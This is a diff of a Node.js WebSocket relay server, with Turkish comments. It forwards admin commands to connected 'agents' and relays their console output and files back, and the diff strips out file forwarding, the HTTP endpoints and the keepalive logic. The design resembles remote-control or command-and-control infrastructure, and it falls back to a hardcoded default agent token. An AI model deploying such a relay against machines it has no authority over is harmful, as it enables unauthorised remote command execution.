@@ -1,4 +1,4 @@
-// server.js (stabil sürüm + admin->agent file forward + geçici HTTP endpoint'ler)
+// server.js (stabil sürüm)
 
 const http = require("http");
 const express = require("express");
@@ -7,38 +7,13 @@ const WebSocket = require("ws");
 
 const app = express();
 app.use(morgan("dev"));
-
-// JSON body'leri tek yerde parse et (upload/receive için)
-app.use(express.json({ limit: "25mb" }));
-
 app.get("/", (req, res) => res.status(200).send("OK"));
 app.get("/healthz", (req, res) => res.status(200).json({ ok: true }));
-
-// 🔹 Geçici HTTP endpoint'ler (agent'tan kalan eski çağrıları 404'e düşürmemek için)
-//    Uzun vadede agent'taki HTTP çağrılarını kaldıracağız.
-app.post("/receive", (req, res) => {
-  // Basit 200 cevabı
-  const sz = JSON.stringify(req.body || {}).length;
-  console.log("[http receive] body-size=", sz);
-  res.status(200).json({ ok: true });
-});
-
-app.post("/upload", (req, res) => {
-  // Yalnızca 200 dön; gerçek upload WS ile ilerliyor
-  const sz = JSON.stringify(req.body || {}).length;
-  console.log("[http upload] body-size=", sz);
-  res.status(200).json({ ok: true });
-});
-
-app.get("/online", (req, res) => {
-  // Basit "ok" + kaç agent açık bilgisi
-  res.status(200).json({ ok: true, openAgents: [...agents.values()].filter(x => x.ws && x.ws.readyState === WebSocket.OPEN).length });
-});
 
 const PORT = process.env.PORT || 8080;
 const server = http.createServer(app);
 
-// ❗ önemli: perMessageDeflate kapalı (büyük/ikili payload'larda daha kararlı)
+// ❗ önemli: perMessageDeflate kapalı
 const wss = new WebSocket.Server({ noServer: true, perMessageDeflate: false });
 
 const AGENT_TOKENS = (process.env.AGENT_TOKENS || "agent1token").split(",");
@@ -62,7 +37,7 @@ function countOpen(setOrMap) {
   return [...setOrMap.values()].filter(x => x.ws && x.ws.readyState === WebSocket.OPEN).length;
 }
 
-// Sunucu-tarafı “yumuşak ping”: her 5 sn ufak paket (uygulama seviyesi)
+// Sunucu-tarafı “yumuşak ping”: her 5 sn ufak paket
 setInterval(() => {
   const payload = JSON.stringify({ type: "srv_ping", ts: Date.now() });
   for (const [aid, entry] of agents) {
@@ -76,23 +51,7 @@ setInterval(() => {
   }
 }, 5000);
 
-// (İsteğe bağlı) TCP/WS katmanı için ping/pong yaşam kontrolü
-function installPong(ws) {
-  ws.isAlive = true;
-  ws.on("pong", () => (ws.isAlive = true));
-}
-setInterval(() => {
-  for (const ws of [...admins, ...[...agents.values()].map(x => x.ws)]) {
-    if (!ws) continue;
-    if (ws.isAlive === false) { try { ws.terminate(); } catch {} continue; }
-    ws.isAlive = false;
-    try { ws.ping(); } catch {}
-  }
-}, 30000);
-
 wss.on("connection", (ws, req) => {
-  installPong(ws);
-
   const connId = Math.random().toString(36).slice(2, 8);
   ws.connId = connId;
 
@@ -109,17 +68,10 @@ wss.on("connection", (ws, req) => {
 
   ws.on("close", (code, reasonBuf) => {
     const reason = reasonBuf ? reasonBuf.toString() : "";
-    console.log(
-      `[close] ${connId} code=${code} reason="${reason}" kind=${ws.kind || "-"} agentId=${ws.agentId || "-"} ` +
-      `openAgents=${countOpen(agents)} openAdmins=${countOpen(admins)}`
-    );
+    console.log(`[close] ${connId} code=${code} reason="${reason}" kind=${ws.kind || "-"} agentId=${ws.agentId || "-"} openAgents=${countOpen(agents)} openAdmins=${countOpen(admins)}`);
     if (ws.kind === "agent" && ws.agentId && agents.has(ws.agentId)) {
-      // sadece aynı ws ise temizle (yenisini yanlışlıkla silmeyelim)
-      const cur = agents.get(ws.agentId);
-      if (cur && cur.ws === ws) {
-        agents.delete(ws.agentId);
-        broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
-      }
+      agents.delete(ws.agentId);
+      broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
     }
     if (ws.kind === "admin") admins.delete(ws);
   });
@@ -132,51 +84,27 @@ wss.on("connection", (ws, req) => {
 
     if (ws.kind === "agent") {
       if (msg.type === "hello") {
-        const incomingId = msg.agentId || ("agent-" + Math.random().toString(36).slice(2, 8));
-
-        // Aynı agentId ile eski bir bağlantı varsa kapatıp yenisiyle değiştir
-        const existing = agents.get(incomingId);
-        if (existing && existing.ws !== ws) {
-          try { existing.ws.close(4000, "replaced by newer connection"); } catch {}
-        }
-
-        ws.agentId = incomingId;
+        ws.agentId = msg.agentId || ("agent-" + Math.random().toString(36).slice(2, 8));
         agents.set(ws.agentId, { ws, info: msg });
         console.log(`[agent:hello] ${connId} => agentId=${ws.agentId} openAgents=${countOpen(agents)}`);
         broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
       } else if (msg.type === "resp" || msg.type === "file" || msg.type === "console_chunk" || msg.type === "console_end") {
-        // Agent'tan gelen yanıtları adminlere aktar
         broadcastAdmins({ type: msg.type, agentId: ws.agentId, payload: msg, ...msg });
+      } else {
+        // diğer tipler
       }
       return;
     }
 
     if (ws.kind === "admin") {
-      // 1) Komutları forward et (cmd)
-      if (msg.type === "cmd") {
-        if (!msg.target || !msg.cmd) { sendJson(ws, { type: "error", message: "bad cmd payload" }); return; }
+      if (msg.type === "cmd" && msg.target && msg.cmd) {
         const entry = agents.get(msg.target);
         if (entry && entry.ws.readyState === WebSocket.OPEN) {
-          try { entry.ws.send(JSON.stringify(msg)); } catch {}
+          sendJson(entry.ws, msg);
         } else {
           sendJson(ws, { type: "error", message: "agent not available" });
         }
-        return;
       }
-
-      // 2) Dosya transfer iletilerini forward et (file: start/chunk/end)
-      if (msg.type === "file") {
-        if (!msg.target || !msg.mode) { sendJson(ws, { type: "error", message: "bad file payload" }); return; }
-        const entry = agents.get(msg.target);
-        if (entry && entry.ws.readyState === WebSocket.OPEN) {
-          try { entry.ws.send(JSON.stringify(msg)); } catch {}
-        } else {
-          sendJson(ws, { type: "error", message: "agent not available" });
-        }
-        return;
-      }
-
-      // Gerekirse başka admin mesaj tipleri için case ekleyebilirsin
       return;
     }
   });
